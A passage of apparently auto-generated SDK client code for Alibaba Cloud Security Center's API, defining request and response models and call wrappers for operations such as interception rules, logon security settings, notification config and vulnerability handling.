  taskType?: string(name='TaskType', example='VIRUS_VUL_SCHEDULE_SCAN'),
}

model ModifyCycleTaskResponseBody = {
  requestId?: string(name='RequestId', example='1AA33E30-7192-5648-93CD-D0E476A2****'),
}

model ModifyCycleTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyCycleTaskResponseBody(name='body'),
}

async function modifyCycleTaskWithOptions(request: ModifyCycleTaskRequest, runtime: Util.RuntimeOptions): ModifyCycleTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.configId)) {
    query['ConfigId'] = request.configId;
  }
  if (!Util.isUnset(request.enable)) {
    query['Enable'] = request.enable;
  }
  if (!Util.isUnset(request.firstDateStr)) {
    query['FirstDateStr'] = request.firstDateStr;
  }
  if (!Util.isUnset(request.intervalPeriod)) {
    query['IntervalPeriod'] = request.intervalPeriod;
  }
  if (!Util.isUnset(request.param)) {
    query['Param'] = request.param;
  }
  if (!Util.isUnset(request.periodUnit)) {
    query['PeriodUnit'] = request.periodUnit;
  }
  if (!Util.isUnset(request.targetEndTime)) {
    query['TargetEndTime'] = request.targetEndTime;
  }
  if (!Util.isUnset(request.targetStartTime)) {
    query['TargetStartTime'] = request.targetStartTime;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyCycleTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyCycleTask(request: ModifyCycleTaskRequest): ModifyCycleTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyCycleTaskWithOptions(request, runtime);
}

model ModifyEmgVulSubmitRequest {
  lang?: string(name='Lang', example='zh'),
  name?: string(name='Name', example='scan:ASCV-2019-032401'),
  userAgreement?: string(name='UserAgreement', example='yes'),
}

model ModifyEmgVulSubmitResponseBody = {
  requestId?: string(name='RequestId', example='52A3AEE6-114A-499D-8990-4BA9B27FE0AA'),
}

model ModifyEmgVulSubmitResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyEmgVulSubmitResponseBody(name='body'),
}

async function modifyEmgVulSubmitWithOptions(request: ModifyEmgVulSubmitRequest, runtime: Util.RuntimeOptions): ModifyEmgVulSubmitResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.userAgreement)) {
    query['UserAgreement'] = request.userAgreement;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyEmgVulSubmit',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyEmgVulSubmit(request: ModifyEmgVulSubmitRequest): ModifyEmgVulSubmitResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyEmgVulSubmitWithOptions(request, runtime);
}

model ModifyGroupPropertyRequest {
  data?: string(name='Data', example='[{"groupFlag":1,"groupId":8436682,"groupIndex":,"groupName":"example"}]'),
}

model ModifyGroupPropertyResponseBody = {
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model ModifyGroupPropertyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyGroupPropertyResponseBody(name='body'),
}

async function modifyGroupPropertyWithOptions(request: ModifyGroupPropertyRequest, runtime: Util.RuntimeOptions): ModifyGroupPropertyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.data)) {
    query['Data'] = request.data;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyGroupProperty',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyGroupProperty(request: ModifyGroupPropertyRequest): ModifyGroupPropertyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyGroupPropertyWithOptions(request, runtime);
}

model ModifyInstanceAntiBruteForceRuleRequest {
  newRuleId?: long(name='NewRuleId', example='65767'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', example='1.2.XX.XX'),
  uuid?: string(name='Uuid', example='7cc91747-2845-40d4-bb69-c077597f****'),
}

model ModifyInstanceAntiBruteForceRuleResponseBody = {
  requestId?: string(name='RequestId', example='4BE468CE-47A0-54F0-98A1-E253546E6A2C'),
}

model ModifyInstanceAntiBruteForceRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyInstanceAntiBruteForceRuleResponseBody(name='body'),
}

async function modifyInstanceAntiBruteForceRuleWithOptions(request: ModifyInstanceAntiBruteForceRuleRequest, runtime: Util.RuntimeOptions): ModifyInstanceAntiBruteForceRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.newRuleId)) {
    query['NewRuleId'] = request.newRuleId;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyInstanceAntiBruteForceRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyInstanceAntiBruteForceRule(request: ModifyInstanceAntiBruteForceRuleRequest): ModifyInstanceAntiBruteForceRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyInstanceAntiBruteForceRuleWithOptions(request, runtime);
}

model ModifyInterceptionRuleRequest {
  clusterId?: string(name='ClusterId', example='c17ef568f81884cdab402decd5fcd****'),
  dstTarget?: map[string]any(name='DstTarget', example='{"targetId":600069,"ports":["80/8088"]}'),
  interceptType?: int32(name='InterceptType', example='1'),
  orderIndex?: long(name='OrderIndex', example='1'),
  ruleId?: long(name='RuleId', example='500018'),
  ruleName?: string(name='RuleName', example='tetsRule'),
  ruleSwitch?: int32(name='RuleSwitch', example='1'),
  srcTarget?: map[string]any(name='SrcTarget', example='{"targetId":400989}'),
}

model ModifyInterceptionRuleShrinkRequest {
  clusterId?: string(name='ClusterId', example='c17ef568f81884cdab402decd5fcd****'),
  dstTargetShrink?: string(name='DstTarget', example='{"targetId":600069,"ports":["80/8088"]}'),
  interceptType?: int32(name='InterceptType', example='1'),
  orderIndex?: long(name='OrderIndex', example='1'),
  ruleId?: long(name='RuleId', example='500018'),
  ruleName?: string(name='RuleName', example='tetsRule'),
  ruleSwitch?: int32(name='RuleSwitch', example='1'),
  srcTargetShrink?: string(name='SrcTarget', example='{"targetId":400989}'),
}

model ModifyInterceptionRuleResponseBody = {
  requestId?: string(name='RequestId', example='6961B151-B43C-533B-8B2E-1D3151D7F5B2'),
}

model ModifyInterceptionRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyInterceptionRuleResponseBody(name='body'),
}

async function modifyInterceptionRuleWithOptions(tmpReq: ModifyInterceptionRuleRequest, runtime: Util.RuntimeOptions): ModifyInterceptionRuleResponse {
  Util.validateModel(tmpReq);
  var request = new ModifyInterceptionRuleShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.dstTarget)) {
    request.dstTargetShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.dstTarget, 'DstTarget', 'json');
  }
  if (!Util.isUnset(tmpReq.srcTarget)) {
    request.srcTargetShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.srcTarget, 'SrcTarget', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.dstTargetShrink)) {
    query['DstTarget'] = request.dstTargetShrink;
  }
  if (!Util.isUnset(request.interceptType)) {
    query['InterceptType'] = request.interceptType;
  }
  if (!Util.isUnset(request.orderIndex)) {
    query['OrderIndex'] = request.orderIndex;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.ruleSwitch)) {
    query['RuleSwitch'] = request.ruleSwitch;
  }
  if (!Util.isUnset(request.srcTargetShrink)) {
    query['SrcTarget'] = request.srcTargetShrink;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyInterceptionRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyInterceptionRule(request: ModifyInterceptionRuleRequest): ModifyInterceptionRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyInterceptionRuleWithOptions(request, runtime);
}

model ModifyInterceptionRuleSwitchRequest {
  clusterId?: string(name='ClusterId', example='ce5c29aba99694ade9ba85dc620b4****'),
  ruleIds?: string(name='RuleIds', example='403287'),
  ruleSwitch?: int32(name='RuleSwitch', example='1'),
}

model ModifyInterceptionRuleSwitchResponseBody = {
  requestId?: string(name='RequestId', example='DE725A60-95F2-50E8-8F5D-81055215E7DA'),
}

model ModifyInterceptionRuleSwitchResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyInterceptionRuleSwitchResponseBody(name='body'),
}

async function modifyInterceptionRuleSwitchWithOptions(request: ModifyInterceptionRuleSwitchRequest, runtime: Util.RuntimeOptions): ModifyInterceptionRuleSwitchResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.ruleIds)) {
    query['RuleIds'] = request.ruleIds;
  }
  if (!Util.isUnset(request.ruleSwitch)) {
    query['RuleSwitch'] = request.ruleSwitch;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyInterceptionRuleSwitch',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyInterceptionRuleSwitch(request: ModifyInterceptionRuleSwitchRequest): ModifyInterceptionRuleSwitchResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyInterceptionRuleSwitchWithOptions(request, runtime);
}

model ModifyInterceptionTargetRequest {
  appName?: string(name='AppName', example='yasintt-daemonst'),
  imageList?: [ string ](name='ImageList'),
  namespace?: string(name='Namespace', example='demo4'),
  tagList?: [ string ](name='TagList'),
  targetId?: long(name='TargetId', example='400913'),
  targetName?: string(name='TargetName', example='test001'),
  targetType?: string(name='TargetType', example='IMAGE'),
}

model ModifyInterceptionTargetResponseBody = {
  requestId?: string(name='RequestId', example='16CB4467-56AE-546C-BF19-AD4584C0DD03'),
  result?: boolean(name='Result', example='true'),
}

model ModifyInterceptionTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyInterceptionTargetResponseBody(name='body'),
}

async function modifyInterceptionTargetWithOptions(request: ModifyInterceptionTargetRequest, runtime: Util.RuntimeOptions): ModifyInterceptionTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.imageList)) {
    query['ImageList'] = request.imageList;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.tagList)) {
    query['TagList'] = request.tagList;
  }
  if (!Util.isUnset(request.targetId)) {
    query['TargetId'] = request.targetId;
  }
  if (!Util.isUnset(request.targetName)) {
    query['TargetName'] = request.targetName;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyInterceptionTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyInterceptionTarget(request: ModifyInterceptionTargetRequest): ModifyInterceptionTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyInterceptionTargetWithOptions(request, runtime);
}

model ModifyLogMetaStatusRequest {
  from?: string(name='From', example='sas'),
  logStore?: string(name='LogStore', example='aegis-log-login'),
  project?: string(name='Project', example='aegis-log'),
  status?: string(name='Status', example='disabled'),
}

model ModifyLogMetaStatusResponseBody = {
  requestId?: string(name='RequestId', example='861445A7-B6D6-5825-B015-CD46ED90613A'),
}

model ModifyLogMetaStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyLogMetaStatusResponseBody(name='body'),
}

async function modifyLogMetaStatusWithOptions(request: ModifyLogMetaStatusRequest, runtime: Util.RuntimeOptions): ModifyLogMetaStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.logStore)) {
    query['LogStore'] = request.logStore;
  }
  if (!Util.isUnset(request.project)) {
    query['Project'] = request.project;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyLogMetaStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyLogMetaStatus(request: ModifyLogMetaStatusRequest): ModifyLogMetaStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyLogMetaStatusWithOptions(request, runtime);
}

model ModifyLoginBaseConfigRequest {
  config?: string(name='Config', description='The details of the configuration that is used to detect unusual logons to your servers. The value of this parameter is in the JSON format and contains the following fields:

*   **totalCount**: the total number of servers.
*   **uuidCount**: the number of servers to which the configuration is applied.
*   **id**: the ID of the configuration.
*   **location**: the common logon location.

> You must specify this field if the Type parameter is set to login_common_location.

*   **ip**: the common logon IP address.

> You must specify this field if the Type parameter is set to login_common_ip.

*   **endTime**: the end time of the common logon time range.

> You must specify this field if the Type parameter is set to login_common_time.

*   **startTime**: the start time of the common logon time range.

> You must specify this field if the Type parameter is set to login_common_time.

*   **account**: the common logon account.

> You must specify this field if the Type parameter is set to login_common_account.', example='{"totalCount":174,"uuidCount":4,"location":"Montenegro","id":0}'),
  target?: string(name='Target', description='The details of the server to which the configuration is applied. The value of this parameter is in the JSON format and contains the following fields:

*   **Target**: the UUID of the server.

*   **targetType**: the type of the server to which the configuration is applied. Valid values:

    *   **uuid**: a server
    *   **groupId**: a server group

*   **flag**: the operation that you want to perform on the server. Valid values:

    *   **del**: removes the server from the configuration.
    *   **add**: adds the server to the configuration.', example='[{"target":"inet-7c676676-06fa-442e-90fb-b802e5d6****","targetType":"uuid","flag":"add"}]'),
  type?: string(name='Type', description='The logon type of the configuration to modify. Valid values:

*   **login\\_common_location**: common logon location
*   **login\\_common_ip**: common logon IP address
*   **login\\_common_time**: common logon time range
*   **login\\_common_account**: common logon account', example='login_common_location'),
}

model ModifyLoginBaseConfigResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AB96FDDF-ED29-52B1-9FAE-8203F2808F24'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ModifyLoginBaseConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyLoginBaseConfigResponseBody(name='body'),
}

async function modifyLoginBaseConfigWithOptions(request: ModifyLoginBaseConfigRequest, runtime: Util.RuntimeOptions): ModifyLoginBaseConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyLoginBaseConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyLoginBaseConfig(request: ModifyLoginBaseConfigRequest): ModifyLoginBaseConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyLoginBaseConfigWithOptions(request, runtime);
}

model ModifyLoginSwitchConfigRequest {
  item?: string(name='Item', description='The type of the logon security settings that you want to enable or disable. Valid values:

*   **login\\_common_ip**: unapproved logon IP addresses
*   **login\\_common_time**: unapproved logon time ranges
*   **login\\_common_account**: unapproved logon accounts', example='login_common_account'),
  status?: int32(name='Status', description='Specifies whether to enable the logon security settings. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
}

model ModifyLoginSwitchConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B256A525-7E42-4BB9-A27C-9017FDDFF1A2'),
}

model ModifyLoginSwitchConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyLoginSwitchConfigResponseBody(name='body'),
}

async function modifyLoginSwitchConfigWithOptions(request: ModifyLoginSwitchConfigRequest, runtime: Util.RuntimeOptions): ModifyLoginSwitchConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.item)) {
    query['Item'] = request.item;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyLoginSwitchConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyLoginSwitchConfig(request: ModifyLoginSwitchConfigRequest): ModifyLoginSwitchConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyLoginSwitchConfigWithOptions(request, runtime);
}

model ModifyNoticeConfigRequest {
  project?: string(name='Project', description='The identifier of the notification item. Valid values:

*   **yundun\\_security_Weekreport**: notification for vulnerabilities
*   **yundun\\_sas\\_antiransomware_task**: notification for results of restoration tasks
*   **sas_healthcheck**: notification for baseline checks
*   **sas_suspicious**: notification for alerts generated by Security Center
*   **yundun\\_aegis\\_AV_true**: notification for precision defense
*   **yundun\\_sas\\_ak_leakage**: notification for AccessKey pair leaks
*   **yundun\\_sas\\_config_alert**: notification for configuration assessment
*   **yundun\\_sas\\_vul_Emergency**: notification for urgent vulnerabilities
*   **yundun\\_webguard_event**: notification for web tamper proofing
*   **yundun\\_sas\\_cloud\\_native_firewall**: notification for alerts generated by the container firewall feature
*   **yundun\\_sas\\_cloud\\_native\\_firewall_Defense**: notification for proactive defense implemented by the container firewall feature
*   **yundun\\_IP_Blocking**: notification for blocked brute-force attacks initiated from malicious IP addresses
*   **yundun\\_sas\\_anti\\_virus_config**: notification for virus scan
*   **yundun\\_sas_log**: notification for excess logs
*   **yundun\\_honeypot_alarm**: notification for alerts generated by the honeypot feature
*   **aliyun\\_rasp_alarm**: notification for alerts generated by the application security feature
*   **virusScheduleTask**: notification for completion of scheduled virus scans
*   **yundun\\_anti_Virus**: notification that no security checks are performed
*   **sas_vulnerability**: notification for vulnerabilities
*   **weeklyreport**: notification for weekly reports
*   **agent**: notification that the Security Center agent is offline
*   **bruteforcesuccess**: notification for protection against brute-force attacks
*   **webshell**: notification for webshells
*   **suspicious**: notification for alerts generated by Server Guard
*   **patch**: deprecated
*   **remotelogin**: notification for remote logons
*   **health**: notification for security checks
*   **yundun\\_sas\\_cloudsiem_log**: notifications of insufficient threat analysis log capacity

> If the value is **yundun\\_security_Weekreport**, weekly reports are sent to notify you of unhandled vulnerabilities.', example='yundun_webguard_event'),
  route?: int32(name='Route', description='The notification method. Valid values:

*   **1**: text message
*   **2**: email
*   **4**: internal message
*   **3**: text message and email
*   **5**: text message and internal message
*   **6**: email and internal message
*   **7**: text message, email, and internal message', example='4'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='42.178.XX.XX'),
  timeLimit?: int32(name='TimeLimit', description='The time period during which Security Center sends notifications. Valid values:

*   **0**: any time
*   **1**: 08:00 to 22:00', example='1'),
}

model ModifyNoticeConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5989D067-621F-51E2-A636-D94D1388****'),
}

model ModifyNoticeConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyNoticeConfigResponseBody(name='body'),
}

async function modifyNoticeConfigWithOptions(request: ModifyNoticeConfigRequest, runtime: Util.RuntimeOptions): ModifyNoticeConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.project)) {
    query['Project'] = request.project;
  }
  if (!Util.isUnset(request.route)) {
    query['Route'] = request.route;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.timeLimit)) {
    query['TimeLimit'] = request.timeLimit;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyNoticeConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyNoticeConfig(request: ModifyNoticeConfigRequest): ModifyNoticeConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyNoticeConfigWithOptions(request, runtime);
}

model ModifyOpenLogShipperRequest {
  from?: string(name='From', example='sas'),
}

model ModifyOpenLogShipperResponseBody = {
  requestId?: string(name='RequestId', example='25EC270F-5783-4416-AD7C-1EDF063A039C'),
}

model ModifyOpenLogShipperResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyOpenLogShipperResponseBody(name='body'),
}

/**
  * The ID of the request, which is used to locate and troubleshoot issues.
  *
  * @param request ModifyOpenLogShipperRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ModifyOpenLogShipperResponse
 */
async function modifyOpenLogShipperWithOptions(request: ModifyOpenLogShipperRequest, runtime: Util.RuntimeOptions): ModifyOpenLogShipperResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyOpenLogShipper',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * The ID of the request, which is used to locate and troubleshoot issues.
  *
  * @param request ModifyOpenLogShipperRequest
  * @return ModifyOpenLogShipperResponse
 */
async function modifyOpenLogShipper(request: ModifyOpenLogShipperRequest): ModifyOpenLogShipperResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyOpenLogShipperWithOptions(request, runtime);
}

model ModifyOperateVulRequest {
  info?: string(name='Info', description='The operation that you want to perform on the vulnerability. Valid values:

*   **vul_fix**: fixes the vulnerability.
*   **vul_verify**: verifies the vulnerability fix.
*   **vul_ignore**: ignores the vulnerability.
*   **vul_undo_ignore**: cancels ignoring the vulnerability.
*   **vul_delete**: deletes the vulnerability.', example='[{"name":"alilinux2:2.1903:ALINUX2-SA-2022:0007","uuid":"a3bb82a8-a3bd-4546-acce-45ac34af****","tag":"oval","isFront":0},{"name":"alilinux2:2.1903:ALINUX2-SA-2022:0007","uuid":"98a6fecc-88cd-46f2-8e35-f808a388****","tag":"oval","isFront":0}]'),
  operateType?: string(name='OperateType', description='Handles detected vulnerabilities. You can fix or ignore vulnerabilities. You can also verify the vulnerability fixes.', example='vul_fix'),
  reason?: string(name='Reason', example='not operate'),
  type?: string(name='Type', description='ModifyOperateVul', example='cve'),
}

model ModifyOperateVulResponseBody = {
  requestId?: string(name='RequestId', example='DFE4F166-1AC9-4FAC-A4E4-F0608AD705A6'),
}

model ModifyOperateVulResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyOperateVulResponseBody(name='body'),
}

async function modifyOperateVulWithOptions(request: ModifyOperateVulRequest, runtime: Util.RuntimeOptions): ModifyOperateVulResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.info)) {
    query['Info'] = request.info;
  }
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyOperateVul',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyOperateVul(request: ModifyOperateVulRequest): ModifyOperateVulResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyOperateVulWithOptions(request, runtime);
}

model ModifyPropertyScheduleConfigRequest {
  scheduleTime?: string(name='ScheduleTime', example='3'),
  type?: string(name='Type', example='scheduler_port_period'),
}

model ModifyPropertyScheduleConfigResponseBody = {
  modifyResult?: boolean(name='ModifyResult', example='true'),
  requestId?: string(name='RequestId', example='C0D1DF51-D879-55A8-B6C7-7D3B913EF34D'),
}

model ModifyPropertyScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyPropertyScheduleConfigResponseBody(name='body'),
}

async function modifyPropertyScheduleConfigWithOptions(request: ModifyPropertyScheduleConfigRequest, runtime: Util.RuntimeOptions): ModifyPropertyScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.scheduleTime)) {
    query['ScheduleTime'] = request.scheduleTime;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyPropertyScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyPropertyScheduleConfig(request: ModifyPropertyScheduleConfigRequest): ModifyPropertyScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyPropertyScheduleConfigWithOptions(request, runtime);
}

model ModifyPushAllTaskRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  tasks?: string(name='Tasks', description='The UUIDs of servers on which you want to perform security check tasks. Separate multiple UUIDs with commas (,).', example='HEALTH_CHECK,OVAL_ENTITY'),
  uuids?: string(name='Uuids', description='The message that describes the security check failure.', example='inet-923b4538-0e88-409d-80ba-cb2e7487****,dc1691eb-656f-472f-b2aa-04f621f4****,70452f92-9fc1-45c5-ab35-e7bf8552****'),
}

model ModifyPushAllTaskResponseBody = {
  pushTaskRsp?: {
    pushTaskResultList?: [ 
      {
        groupId?: long(name='GroupId', description='The region in which the server resides.', example='226'),
        instanceId?: string(name='InstanceId', example='i-wz9f7wlklxqnvdk****'),
        instanceName?: string(name='InstanceName', description='The ID of the server.', example='TestInstance'),
        ip?: string(name='Ip'),
        message?: string(name='Message', description='ModifyPushAllTask', example='successful'),
        online?: boolean(name='Online', description='Performs security check tasks on servers with a few clicks.', example='false'),
